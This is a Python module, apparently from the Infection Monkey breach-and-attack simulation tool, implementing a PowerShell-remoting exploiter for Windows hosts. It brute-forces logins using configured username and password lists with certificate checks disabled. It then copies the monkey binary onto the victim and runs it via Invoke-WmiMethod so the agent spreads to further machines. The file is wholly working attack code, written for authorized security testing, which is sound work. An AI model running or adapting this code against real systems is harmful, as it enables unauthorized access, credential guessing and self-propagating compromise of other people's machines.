import logging
import os
import typing

import spnego
from pypsrp.client import Client
from pypsrp.powershell import PowerShell, RunspacePool
from urllib3 import connectionpool

import infection_monkey.monkeyfs as monkeyfs
from common.utils.exceptions import FailedExploitationError
from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import (
    build_monkey_commandline,
    get_monkey_depth,
    get_target_monkey_by_os,
)
from infection_monkey.exploit.web_rce import WIN_ARCH_32, WIN_ARCH_64
from infection_monkey.model import DROPPER_ARG, GET_ARCH_WINDOWS, RUN_MONKEY, VictimHost

LOG = logging.getLogger(__name__)

TEMP_MONKEY_BINARY_FILEPATH = "./monkey_temp_bin"


class PowershellExploiter(HostExploiter):
    # attack URLs
    _TARGET_OS_TYPE = ["windows"]
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    _EXPLOITED_SERVICE = "Powershell remote"

    def __init__(self, host: VictimHost):
        # If pysrp will inherit root logger, it will log extensive and potentially sensitive info
        logging.getLogger("pypsrp").setLevel(logging.ERROR)
        logging.getLogger(spnego.__name__).setLevel(logging.ERROR)
        logging.getLogger(connectionpool.__name__).setLevel(logging.ERROR)

        super().__init__(host)
        self.client = None

    def _exploit_host(self):
        try:
            self.client = self.exploit_without_credentials()
        except FailedExploitationError:
            LOG.info("Failed exploitation without credentials.")
            try:
                self.client = self.exploit_with_usernames_only(
                    usernames=self._config.exploit_user_list
                )
            except FailedExploitationError:
                LOG.info("Failed exploitation using username list.")
                try:
                    self.client = self.exploit_with_credentials(
                        self._config.get_exploit_user_password_pairs()
                    )
                except FailedExploitationError:
                    LOG.info("Failed exploitation using credentials from configuration. Quiting.")
                    return False

        arch = self.get_host_arch()

        monkey_fs_path = get_target_monkey_by_os(is_windows=True, is_32bit=(arch == WIN_ARCH_32))

        # write virtual file to actual local file
        with monkeyfs.open(monkey_fs_path) as monkey_virtual_file:
            with open(TEMP_MONKEY_BINARY_FILEPATH, "wb") as monkey_local_file:
                monkey_local_file.write(monkey_virtual_file.read())

        try:
            if arch == WIN_ARCH_32:
                monkey_path_on_victim = self._config.dropper_target_path_win_32
            else:
                monkey_path_on_victim = self._config.dropper_target_path_win_64

            self.client.copy(TEMP_MONKEY_BINARY_FILEPATH, monkey_path_on_victim)
        except Exception:
            return False
        finally:
            os.remove(TEMP_MONKEY_BINARY_FILEPATH)

        monkey_params = build_monkey_commandline(
            target_host=self.host,
            depth=get_monkey_depth() - 1,
            vulnerable_port=None,
            location=monkey_path_on_victim,
        )

        monkey_execution_command = RUN_MONKEY % {
            "monkey_path": monkey_path_on_victim,
            "monkey_type": DROPPER_ARG,
            "parameters": monkey_params,
        }

        with self.client.wsman, RunspacePool(self.client.wsman) as pool:
            ps = PowerShell(pool)
            ps.add_cmdlet("Invoke-WmiMethod").add_parameter("path", "win32_process").add_parameter(
                "name", "create"
            ).add_parameter("ArgumentList", monkey_execution_command)
            ps.invoke()

        return True

    def exploit_without_credentials(self) -> Client:
        return self.try_exploit()

    def exploit_with_usernames_only(self, usernames: typing.List[str]) -> Client:
        for username in usernames:
            try:
                client = self.try_exploit(username)
                return client
            except FailedExploitationError:
                pass
        raise FailedExploitationError

    def exploit_with_credentials(
        self, credential_list: typing.List[typing.Tuple[str, str]]
    ) -> Client:
        for username, password in credential_list:
            try:
                client = self.try_exploit(username, password)
                return client
            except FailedExploitationError:
                pass
        raise FailedExploitationError

    def try_exploit(
        self, username: typing.Optional[str] = None, password: typing.Optional[str] = None
    ) -> Client:
        try:
            with Client(
                self.host.ip_addr,
                username=username,
                password=password,
                cert_validation=False,
            ) as client:
                # attempt to execute dir command to know if authentication was successful
                client.execute_cmd("dir")
                return client
        except Exception:
            raise FailedExploitationError

    def get_host_arch(self) -> typing.Union[WIN_ARCH_32, WIN_ARCH_64]:
        output = self.execute_cmd_on_host(GET_ARCH_WINDOWS)
        if "64-bit" in output:
            return WIN_ARCH_64
        else:
            return WIN_ARCH_32

    def execute_cmd_on_host(self, cmd: str) -> str:
        output, _, _ = self.client.execute_cmd(cmd)
        return output
